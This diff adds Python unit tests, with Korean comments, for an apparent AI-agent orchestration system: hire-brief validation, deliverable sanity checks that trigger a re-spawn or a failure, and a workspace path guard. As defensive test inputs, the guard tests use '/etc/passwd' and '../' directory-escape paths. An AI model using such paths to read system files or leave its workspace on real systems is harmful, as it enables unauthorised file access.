+        # 파싱 실패 (SyntaxError) — docstring 은 생략하되 파일은 항상 목록에 남아야 함.
+        (lead.ws_main / "src" / "broken.py").write_text("def x(:\n    pass\n")
+
+        summary = lead._ws_main_summary()
+        # docstring 첫 줄 노출
+        assert "모듈 첫 줄 설명" in summary, summary
+        # docstring 두 번째 줄 (본문) 은 노출 안 됨 — 첫 줄만
+        assert "자세한 설명" not in summary
+        # docstring 없는 파일도 목록에 — 라벨 없이
+        assert "src/no_doc.py" in summary
+        # 파싱 실패 파일도 목록에 — docstring 조용히 생략
+        assert "src/broken.py" in summary
+
+
+def test_hire_brief_rejects_missing_kind_and_retries():
+    """decomposer 응답에 kind 누락 시 재시도 트리거 (다음 시도에서 kind 포함하면 통과)."""
+    with tempfile.TemporaryDirectory() as d:
+        llm = _FakeLLM(
+            [
+                # 1차: kind 누락 → reject
+                '{"mission":"X","deliverables":[],"verification_checks":[],'
+                '"system_prompt":"p","allowed_tools":["Write"]}',
+                # 2차: kind 포함 → 통과
+                '{"mission":"X","kind":"refine","deliverables":[],'
+                '"verification_checks":[],"system_prompt":"p","allowed_tools":["Write"]}',
+            ]
+        )
+        lead = _make_team_lead(Path(d), llm)
+        goal = Goal(id="G-001-x", title="do x", done=False, assigned="")
+        data = lead._llm_hire_brief(goal)
+        assert data is not None
+        assert data["kind"] == "refine"
+        # 정확히 2회 호출됐는지 (1차 거부 → 재시도 1차)
+        assert len(llm.calls) == 2, f"기대 2회 호출, 실제 {len(llm.calls)}"
+
+
+def test_hire_brief_rejects_invalid_kind_value():
+    """kind 값이 허용 집합 밖이면 reject 후 재시도."""
+    with tempfile.TemporaryDirectory() as d:
+        llm = _FakeLLM(
+            [
+                # 1차: 잘못된 kind 값
+                '{"mission":"X","kind":"weird","deliverables":[],'
+                '"verification_checks":[],"system_prompt":"p","allowed_tools":["Write"]}',
+                # 2차: 정상
+                '{"mission":"X","kind":"extend","deliverables":[],'
+                '"verification_checks":[],"system_prompt":"p","allowed_tools":["Write"]}',
+            ]
+        )
+        lead = _make_team_lead(Path(d), llm)
+        goal = Goal(id="G-001-x", title="do x", done=False, assigned="")
+        data = lead._llm_hire_brief(goal)
+        assert data is not None
+        assert data["kind"] == "extend"
+        assert len(llm.calls) == 2
+
+
+def test_hire_brief_auto_prefixes_mission_with_kind_label():
+    """LLM 이 mission 에 [kind=...] prefix 안 붙여도 코드가 자동 보정."""
+    with tempfile.TemporaryDirectory() as d:
+        llm = _FakeLLM(
+            [
+                '{"mission":"실제 미션 본문 첫 문장.","kind":"refine",'
+                '"deliverables":[],"verification_checks":[],'
+                '"system_prompt":"p","allowed_tools":["Write"]}',
+            ]
+        )
+        lead = _make_team_lead(Path(d), llm)
+        goal = Goal(id="G-001-y", title="refine y", done=False, assigned="")
+        data = lead._llm_hire_brief(goal)
+        assert data is not None
+        # 라벨 prefix 자동 부착
+        assert data["mission"].startswith("[kind=refine] "), data["mission"]
+        # 본문 보존
+        assert "실제 미션 본문" in data["mission"]
+
+
+def test_hire_brief_preserves_existing_correct_label():
+    """LLM 이 이미 올바른 [kind=KIND] prefix 를 붙였다면 중복 부착 안 함."""
+    with tempfile.TemporaryDirectory() as d:
+        llm = _FakeLLM(
+            [
+                '{"mission":"[kind=new] 이미 라벨 있음.","kind":"new",'
+                '"deliverables":[],"verification_checks":[],'
+                '"system_prompt":"p","allowed_tools":["Write"]}',
+            ]
+        )
+        lead = _make_team_lead(Path(d), llm)
+        goal = Goal(id="G-001-z", title="z", done=False, assigned="")
+        data = lead._llm_hire_brief(goal)
+        assert data is not None
+        # 라벨 한 번만
+        assert data["mission"].count("[kind=new]") == 1, data["mission"]
+
+
+def test_hire_brief_normalizes_mismatched_label_to_kind_field():
+    """mission prefix 라벨이 kind 필드와 다르면 kind 필드 기준으로 정규화."""
+    with tempfile.TemporaryDirectory() as d:
+        llm = _FakeLLM(
+            [
+                '{"mission":"[kind=remove] 본문","kind":"refine",'
+                '"deliverables":[],"verification_checks":[],'
+                '"system_prompt":"p","allowed_tools":["Write"]}',
+            ]
+        )
+        lead = _make_team_lead(Path(d), llm)
+        goal = Goal(id="G-001-q", title="q", done=False, assigned="")
+        data = lead._llm_hire_brief(goal)
+        assert data is not None
+        # kind 필드(refine) 기준으로 정규화 — mission 의 [kind=remove] 는 교체됨
+        assert data["mission"].startswith("[kind=refine] "), data["mission"]
+        assert "[kind=remove]" not in data["mission"]
+
+
+# ---------- predelivery sanity check (2026-05-14, M007) ----------
+
+
+def _stub_session_manager(monkey_run):
+    """lead.member.SessionManager 를 임시 교체하는 컨텍스트 매니저.
+
+    사용: `with _stub_session_manager(fn): ...`. fn(**kw) → SessionResult.
+    """
+    import contextlib
+
+    import lead.member as mm
+
+    class _FakeSM:
+        def __init__(self, *a, **kw):
+            pass
+
+        def run(self, **kw):
+            return monkey_run(**kw)
+
+    @contextlib.contextmanager
+    def _ctx():
+        orig = mm.SessionManager
+        mm.SessionManager = _FakeSM
+        try:
+            yield
+        finally:
+            mm.SessionManager = orig
+
+    return _ctx()
+
+
+def test_predelivery_sanity_passes_when_all_files_exist():
+    """deliverables 가 cwd 안에 모두 실재하면 spawn 은 1회만 호출되고 DONE."""
+    from core.session_manager import SessionResult
+    from lead.member import HireBrief, MemberSpawner
+
+    with tempfile.TemporaryDirectory() as d:
+        d = Path(d)
+        agents = d / "agents"
+        ws = d / "ws"
+        sp = MemberSpawner(agents, ws, d / "state")
+        brief = HireBrief(
+            agent_id="M001",
+            goal_id="G-x",
+            mission="m",
+            deliverables=["hello.txt", "sub/nested.py"],
+            verification_checks=[],
+            system_prompt="p",
+            allowed_tools=["Write"],
+        )
+        sp.write_brief(brief)
+        # 멤버가 만든 것처럼 deliverable 미리 생성 (크기 > 0)
+        (ws / "M001" / "hello.txt").write_text("hi\n")
+        (ws / "M001" / "sub").mkdir(parents=True, exist_ok=True)
+        (ws / "M001" / "sub" / "nested.py").write_text("x = 1\n")
+
+        calls = []
+
+        def fake_run(**kw):
+            calls.append(kw.get("task_id"))
+            return SessionResult(
+                success=True,
+                output="ok\n[STATUS:DONE]",
+                error="",
+                session_id="s1",
+                cost_usd=0.1,
+            )
+
+        with _stub_session_manager(fake_run):
+            result = sp.spawn(brief)
+
+        assert result.status == "DONE", result
+        assert len(calls) == 1, f"기대 1회 spawn, 실제 {len(calls)}: {calls}"
+        # mailbox 에 sanity feedback 메시지 없음
+        msgs = parse_messages(agents / "M001" / "mailbox.md")
+        assert not any("Predelivery Sanity Feedback" in m.body for m in msgs)
+
+
+def test_predelivery_sanity_missing_file_posts_feedback_and_respawns():
+    """일부 deliverable 누락 → mailbox 에 feedback append + 즉시 재spawn (resume_count 증가)."""
+    from core.session_manager import SessionResult
+    from lead.member import HireBrief, MemberSpawner
+
+    with tempfile.TemporaryDirectory() as d:
+        d = Path(d)
+        agents = d / "agents"
+        ws = d / "ws"
+        sp = MemberSpawner(agents, ws, d / "state")
+        brief = HireBrief(
+            agent_id="M001",
+            goal_id="G-x",
+            mission="m",
+            deliverables=["present.txt", "missing.txt"],
+            verification_checks=[],
+            system_prompt="p",
+            allowed_tools=["Write"],
+        )
+        sp.write_brief(brief)
+        # 첫 spawn 직전: 한 개만 존재
+        (ws / "M001" / "present.txt").write_text("here\n")
+
+        calls = []
+
+        def fake_run(**kw):
+            calls.append(kw.get("task_id"))
+            # 두 번째 spawn 에서 누락 파일 생성 (재작성 시뮬레이션)
+            if len(calls) == 2:
+                (ws / "M001" / "missing.txt").write_text("now here\n")
+            return SessionResult(
+                success=True,
+                output="ok\n[STATUS:DONE]",
+                error="",
+                session_id=f"s{len(calls)}",
+                cost_usd=0.1,
+            )
+
+        with _stub_session_manager(fake_run):
+            result = sp.spawn(brief)
+
+        # 두 번 호출됨 — 첫 번째는 본 spawn, 두 번째는 sanity 재spawn (-r1)
+        assert len(calls) == 2, f"기대 2회, 실제 {calls}"
+        assert calls[0] == "M001"
+        assert calls[1] == "M001-r1"
+        assert result.status == "DONE"
+
+        msgs = parse_messages(agents / "M001" / "mailbox.md")
+        feedback = [m for m in msgs if "Predelivery Sanity Feedback" in m.body]
+        assert len(feedback) == 1, f"feedback 메시지 정확히 1개 기대, 실제 {len(feedback)}"
+        body = feedback[0].body
+        assert "missing" in body
+        assert feedback[0].from_ == "lead"
+        assert feedback[0].to == "M001"
+
+
+def test_predelivery_sanity_outside_cwd_blocks_and_marks_failed():
+    """deliverable 이 절대경로/cwd 밖이면 sanity 차단, retry 한도 후 FAILED 로 격하."""
+    from core.session_manager import SessionResult
+    from lead.member import HireBrief, MemberSpawner
+
+    with tempfile.TemporaryDirectory() as d:
+        d = Path(d)
+        agents = d / "agents"
+        ws = d / "ws"
+        sp = MemberSpawner(agents, ws, d / "state")
+        outside_abs = str(d / "outside_zone" / "leaked.txt")
+        brief = HireBrief(
+            agent_id="M001",
+            goal_id="G-x",
+            mission="m",
+            # 두 가지 위반 패턴: 절대경로 + cwd 상위 이동
+            deliverables=[outside_abs, "../escape.txt"],
+            verification_checks=[],
+            system_prompt="p",
+            allowed_tools=["Write"],
+        )
+        sp.write_brief(brief)
+
+        calls = []
+
+        def fake_run(**kw):
+            calls.append(kw.get("task_id"))
+            return SessionResult(
+                success=True,
+                output="ok\n[STATUS:DONE]",
+                error="",
+                session_id=f"s{len(calls)}",
+                cost_usd=0.1,
+            )
+
+        with _stub_session_manager(fake_run):
+            result = sp.spawn(brief)
+
+        # 본 spawn + 1회 재spawn → 총 2회, 이후에도 위반 지속이라 FAILED 로 격하
+        assert len(calls) == 2, calls
+        assert result.status == "FAILED", result
+        assert "predelivery_sanity_persistent_failure" in result.error
+        assert "outside_cwd" in result.error
+
+        msgs = parse_messages(agents / "M001" / "mailbox.md")
+        feedback = [m for m in msgs if "Predelivery Sanity Feedback" in m.body]
+        assert len(feedback) == 1
+        body = feedback[0].body
+        # 분류 사유만 노출 — 절대경로는 마스킹되므로 path 자체는 검사하지 않음
+        assert "outside_cwd" in body
+
+
+def test_predelivery_sanity_zero_byte_file_treated_as_missing():
+    """크기 0 인 파일은 missing 으로 분류 (실제 산출물 부재 케이스)."""
+    from core.session_manager import SessionResult
+    from lead.member import HireBrief, MemberSpawner
+
+    with tempfile.TemporaryDirectory() as d:
+        d = Path(d)
+        agents = d / "agents"
+        ws = d / "ws"
+        sp = MemberSpawner(agents, ws, d / "state")
+        brief = HireBrief(
+            agent_id="M001",
+            goal_id="G-x",
+            mission="m",
+            deliverables=["empty.py"],
+            verification_checks=[],
+            system_prompt="p",
+            allowed_tools=["Write"],
+        )
+        sp.write_brief(brief)
+        # 빈 파일 — touch
+        (ws / "M001" / "empty.py").write_text("")
+
+        calls = []
+
+        def fake_run(**kw):
+            calls.append(kw.get("task_id"))
+            # 두 번째 spawn 에서도 빈 파일 그대로 유지 → 한도 후 FAILED 기대
+            return SessionResult(
+                success=True,
+                output="ok\n[STATUS:DONE]",
+                error="",
+                session_id="s",
+                cost_usd=0.1,
+            )
+
+        with _stub_session_manager(fake_run):
+            result = sp.spawn(brief)
+
+        assert len(calls) == 2
+        assert result.status == "FAILED"
+        msgs = parse_messages(agents / "M001" / "mailbox.md")
+        feedback = [m for m in msgs if "Predelivery Sanity Feedback" in m.body]
+        assert len(feedback) == 1
+        assert "missing" in feedback[0].body
+
+
+def test_predelivery_sanity_skipped_when_status_not_done():
+    """STATUS 가 WAITING/FAILED 이면 sanity check 도, mailbox feedback 도 없다."""
+    from core.session_manager import SessionResult
+    from lead.member import HireBrief, MemberSpawner
+
+    with tempfile.TemporaryDirectory() as d:
+        d = Path(d)
+        agents = d / "agents"
+        ws = d / "ws"
+        sp = MemberSpawner(agents, ws, d / "state")
+        brief = HireBrief(
+            agent_id="M001",
+            goal_id="G-x",
+            mission="m",
+            # deliverable 은 없는 파일이지만 sanity 가 호출되지 않아야 함
+            deliverables=["nothing.txt"],
+            verification_checks=[],
+            system_prompt="p",
+            allowed_tools=["Write"],
+        )
+        sp.write_brief(brief)
+
+        def fake_run(**kw):
+            return SessionResult(
+                success=True,
+                output="paused\n[STATUS:WAITING]",
+                error="",
+                session_id="s",
+                cost_usd=0.1,
+            )
+
+        with _stub_session_manager(fake_run):
+            result = sp.spawn(brief)
+
+        assert result.status == "WAITING"
+        msgs = parse_messages(agents / "M001" / "mailbox.md")
+        assert not any("Predelivery Sanity Feedback" in m.body for m in msgs)
+
+
+def test_path_guard_is_within_cwd_basic():
+    from core.path_guard import is_within_cwd
+
+    with tempfile.TemporaryDirectory() as d:
+        cwd = Path(d) / "ws"
+        cwd.mkdir()
+        # 정상: cwd 안
+        assert is_within_cwd(Path("a.txt"), cwd) is True
+        assert is_within_cwd(Path("sub/b.txt"), cwd) is True
+        # cwd 밖: 절대경로
+        assert is_within_cwd(Path("/etc/passwd"), cwd) is False
+        # cwd 밖: 상위 이동
+        assert is_within_cwd(Path("../outside.txt"), cwd) is False
+
+
+# ---------- deliverable (M007, 2026-05-14) ----------
+
+
+def test_deliverable_missing_or_outside_classifies_reasons():
+    from core.deliverable import missing_or_outside
+
+    with tempfile.TemporaryDirectory() as d:
+        cwd = Path(d) / "ws"
+        cwd.mkdir()
+        # 시드: 한 파일 만들고 한 빈 파일 만들고
+        (cwd / "good.txt").write_text("data\n")
+        (cwd / "empty.txt").write_text("")
+        paths = [
+            Path("good.txt"),  # OK → 결과에 없음
+            Path("absent.txt"),  # missing
+            Path("empty.txt"),  # missing (size 0)
+            Path("/etc/passwd"),  # outside_cwd
+            Path("../sibling.txt"),  # outside_cwd
+        ]
+        issues = missing_or_outside(paths, cwd)
+        # path → reason 매핑
+        m = {str(p): r for p, r in issues}
+        assert "good.txt" not in m
+        assert m.get("absent.txt") == "missing"
+        assert m.get("empty.txt") == "missing"
+        assert m.get("/etc/passwd") == "outside_cwd"
+        assert m.get("../sibling.txt") == "outside_cwd"
+
+
 # ---------- 실행 ----------
 
 if __name__ == "__main__":
     import inspect
+
     mod = sys.modules[__name__]
     tests = [
-        (n, fn) for n, fn in inspect.getmembers(mod, inspect.isfunction)
-        if n.startswith("test_")
+        (n, fn) for n, fn in inspect.getmembers(mod, inspect.isfunction) if n.startswith("test_")
     ]
     passed, failed = 0, []
     for name, fn in tests:
